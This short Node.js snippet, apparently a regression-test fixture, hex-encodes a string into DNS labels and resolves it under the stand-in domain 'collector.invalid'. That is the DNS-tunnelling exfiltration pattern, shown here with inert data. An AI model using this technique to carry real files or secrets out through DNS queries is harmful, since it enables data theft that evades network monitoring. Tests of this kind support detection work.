const dns = require('dns');
const payload = Buffer.from('inert regression payload').toString('hex');
const labels = payload.match(/.{1,63}/g).join('.');
const domain = 'collector.invalid';
dns.resolve4(`${labels}.${domain}`, () => {});
